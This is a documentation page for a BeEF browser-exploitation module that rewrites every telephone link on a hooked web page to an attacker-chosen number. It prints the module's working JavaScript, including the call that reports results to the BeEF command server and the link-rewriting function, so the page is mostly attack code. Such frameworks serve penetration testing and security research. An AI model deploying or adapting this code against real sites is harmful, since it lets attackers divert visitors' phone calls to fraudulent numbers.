## Summary

* **Objective**: Replace all links to a phone number
* **Authors**: bcoles
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/browser/hooked_domain/link_rewrite_tel)

## Internal Working


```js

beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+beef.dom.rewriteTelLinks(tel_number, selector)+' telephone (tel) links rewritten to '+tel_number);

//rewriteTelLinks function

rewriteTelLinks: function(new_number, selector) {
        var count = 0;
        var re = new RegExp("tel:/?/?.*", "gi");
        var sel = (selector == null) ? 'a' : selector;

        $j(sel).each(function() {
                if ($j(this).attr('href') != null) {
                        var url = $j(this).attr('href');
                        if (url.match(re)) {
                                $j(this).attr('href', url.replace(re, "tel:"+new_number)).click(function() { return true; });
                                count++;
                        }
                }
        });

        return count;
},


```

## Feedback
